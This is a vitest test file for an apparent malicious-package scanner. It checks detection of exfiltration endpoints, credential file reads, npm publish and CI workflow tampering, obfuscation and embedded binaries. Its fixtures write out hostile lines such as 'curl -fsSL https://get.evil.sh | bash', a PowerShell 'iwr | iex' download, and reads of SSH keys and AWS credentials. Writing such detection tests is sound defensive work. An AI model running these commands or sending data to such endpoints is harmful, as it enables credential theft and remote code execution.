import { describe, expect, it } from 'vitest';
import { analyze, caps, values } from './helpers.js';
import { classifyHost, isPublicIp, walletLabel } from '../src/analysis/patterns.js';
import { sniffBinary } from '../src/analysis/js.js';

describe('endpoints', () => {
  it('extracts hosts from URL literals and skips documentation hosts', () => {
    const c = caps("const a = 'https://api.acme-telemetry.io/v1/collect';\nconst doc = 'See https://github.com/acme/x/issues and https://developer.mozilla.org/x';\nconst ns = 'http://www.w3.org/2000/svg';");
    expect(c.endpoint?.values).toEqual(['api.acme-telemetry.io']);
  });

  it('flags exfiltration-style endpoints', () => {
    const c = caps(
      [
        "post('https://discord.com/api/webhooks/123/abc');",
        "get('https://api.telegram.org/bot123:abc/sendMessage');",
        "get('https://abcd-1-2-3-4.ngrok-free.app/x');",
        "get('https://webhook.site/0000');",
        "get('https://evil.workers.dev/');",
        "get('http://169.254.169.254/latest/meta-data/');",
      ].join('\n'),
    );
    expect(c['suspicious-endpoint']?.values).toEqual([
      'Cloudflare Workers (evil.workers.dev)',
      'Discord webhook (discord.com)',
      'Telegram bot API (api.telegram.org)',
      'cloud metadata service (169.254.169.254)',
      'ngrok tunnel (abcd-1-2-3-4.ngrok-free.app)',
      'request inspector (webhook.site)',
    ]);
  });

  it('does not flag Discord URLs that are not webhooks', () => {
    expect(caps("const invite = 'https://discord.com/invite/abc';")['suspicious-endpoint']).toBeUndefined();
  });

  it('finds hosts in http.request option objects and concatenated URLs', () => {
    expect(values("require('https').request({ hostname: 'collector.badhost.net', path: '/x' });", 'endpoint')).toEqual(['collector.badhost.net']);
    expect(values("const u = 'https://' + 'discord.com/api/webhooks/' + id;", 'suspicious-endpoint')).toContain('Discord webhook');
  });

  it('extracts public IP literals but not private or version-like ones', () => {
    expect(values("connect('45.33.32.156:4444'); a = '10.0.0.1'; b = '127.0.0.1'; c = '1.2.3.0';", 'endpoint')).toEqual(['45.33.32.156']);
    expect(isPublicIp('8.8.8.8')).toBe(true);
    expect(isPublicIp('192.168.1.10')).toBe(false);
    expect(isPublicIp('300.1.1.1')).toBe(false);
  });

  it('classifies hosts', () => {
    expect(classifyHost('pastebin.com').kind).toBe('suspicious');
    expect(classifyHost('raw.githubusercontent.com').kind).toBe('notable');
    expect(classifyHost('nodejs.org').kind).toBe('doc');
    expect(classifyHost('localhost').kind).toBe('ignored');
    expect(classifyHost('api.stripe.com').kind).toBe('other');
  });
});

describe('wallets, credentials and worms', () => {
  it('recognises wallet addresses and filters constants', () => {
    expect(walletLabel('0x5aAeb6053F3E94C9b9A09f33669435E7Ef1BeAed')).toBe('Ethereum address');
    expect(walletLabel('0x0000000000000000000000000000000000000000')).toBeUndefined();
    expect(walletLabel('bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq')).toBe('Bitcoin address');
    expect(walletLabel('1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2')).toBe('Bitcoin address');
    expect(walletLabel('TNPeeaaFB7K9cmo4uQpcU32zGK8G1NYqeL')).toBe('Tron address');
    expect(walletLabel('Thisisjustalongidentifierwithnodigits')).toBeUndefined();
  });

  it('records wallet RPC methods', () => {
    expect(values("provider.request({ method: 'eth_sendTransaction', params })", 'crypto-wallet')).toEqual(['wallet RPC']);
  });

  it('records credential file references', () => {
    const c = caps("read(path.join(home, '.npmrc'));\nread('~/.ssh/id_rsa');\nread(home + '/.aws/credentials');\nspawn('trufflehog', ['filesystem', '/']);");
    expect(c['credential-files']?.values).toEqual(['.npmrc', 'AWS credentials', 'SSH keys', 'secret scanner (trufflehog)']);
  });

  it('records npm publishing and CI workflow tampering', () => {
    const c = caps("exec('npm publish --access public');\nfetch('https://registry.npmjs.org/-/whoami');\nwrite('.github/workflows/build.yml', yaml);");
    expect(c['npm-publish']?.values).toEqual(['/-/whoami', 'npm publish']);
    expect(c['ci-tamper']?.values).toEqual(['.github/workflows']);
  });

  it('records shell download idioms', () => {
    const c = caps("exec('curl -fsSL https://get.evil.sh | bash');\nexec('powershell -c \"iwr http://x.example/p.ps1 | iex\"');");
    expect(c['shell-download']?.values).toEqual(['PowerShell download', 'PowerShell eval', 'curl', 'pipe to shell']);
  });
});

describe('obfuscation signals', () => {
  it('detects _0x identifiers', () => {
    const code = Array.from({ length: 12 }, (_, i) => `var _0x${(0xa10 + i).toString(16)} = ${i};`).join('\n');
    expect(values(code, 'obfuscation')).toEqual(['hex-identifiers']);
  });

  it('detects dense hex escapes of printable characters', () => {
    const esc = (s: string) => Array.from(s, (ch) => '\\x' + ch.charCodeAt(0).toString(16)).join('');
    const code = `var t = ['${esc('require')}', '${esc('child_process')}', '${esc('exec')}'];`;
    expect(values(code, 'obfuscation')).toEqual(['escaped-strings']);
  });

  it('does not flag escapes of non-printable characters (unicode tables, ANSI codes)', () => {
    const code = `var table = '${Array.from({ length: 60 }, (_, i) => '\\x' + (i % 16).toString(16).padStart(2, '0')).join('')}';\nvar esc = '\\u001b[31m';`;
    expect(caps(code).obfuscation).toBeUndefined();
  });

  it('detects char-code string building', () => {
    const call = 'String.fromCharCode(' + Array.from({ length: 45 }, (_, i) => 97 + (i % 26)).join(',') + ')';
    expect(values(`var s = ${call};`, 'obfuscation')).toEqual(['charcode-strings']);
  });

  it('classifies large base64 blobs by what they decode to', () => {
    const script = Buffer.from(`require('child_process').exec('id'); ${'x'.repeat(900)}`).toString('base64');
    expect(values(`var p = '${script}';`, 'obfuscation')).toEqual(['encoded-script']);
    const random = Buffer.from(Array.from({ length: 900 }, (_, i) => (i * 7919) % 251)).toString('base64');
    expect(values(`var p = '${random}';`, 'encoded-blob')).toEqual(['base64-blob']);
  });

  it('flags executables embedded in base64', () => {
    const elf = Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1]), Buffer.alloc(1200, 1)]).toString('base64');
    const c = caps(`var bin = '${elf}';`);
    expect(c['native-binary']?.values).toEqual(['embedded elf executable']);
    expect(c.obfuscation?.values).toEqual(['embedded-executable']);
  });

  it('ignores image and font data URIs', () => {
    const png = 'data:image/png;base64,' + Buffer.alloc(2000, 7).toString('base64');
    expect(caps(`var img = '${png}';`)['encoded-blob']).toBeUndefined();
  });

  it('flags high-entropy strings', () => {
    const key = Array.from({ length: 160 }, (_, i) => 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'[(i * 37 + 11) % 64]).join('');
    expect(values(`var k = '${key}';`, 'encoded-blob')).toEqual(['high-entropy-strings']);
  });

  it('detects minified files but not readable ones', () => {
    const readable = Array.from({ length: 200 }, (_, i) => `function f${i}(a, b) {\n  return a + b;\n}\n`).join('\n');
    const minified = Array.from({ length: 200 }, (_, i) => `function f${i}(a,b){return a+b}`).join(';');
    const a = analyze({ 'readable.js': readable, 'dist/bundle.js': minified, 'dist/bundle.min.js': minified });
    expect(a.files.find((f) => f.path === 'readable.js')?.minified).toBeUndefined();
    expect(a.files.find((f) => f.path === 'dist/bundle.js')?.minified).toBe(true);
    expect(a.capabilities.minified?.values).toEqual(['dist/bundle.js']);
  });

  it('sniffs binary formats by magic bytes', () => {
    expect(sniffBinary(Buffer.from([0x7f, 0x45, 0x4c, 0x46]))).toBe('elf');
    expect(sniffBinary(Buffer.from([0x00, 0x61, 0x73, 0x6d]))).toBe('wasm');
    expect(sniffBinary(Buffer.from([0xcf, 0xfa, 0xed, 0xfe]))).toBe('macho');
    expect(sniffBinary(Buffer.from('MZ just text that is long enough to have a header'.padEnd(80, '.')))).toBeUndefined();
  });
});
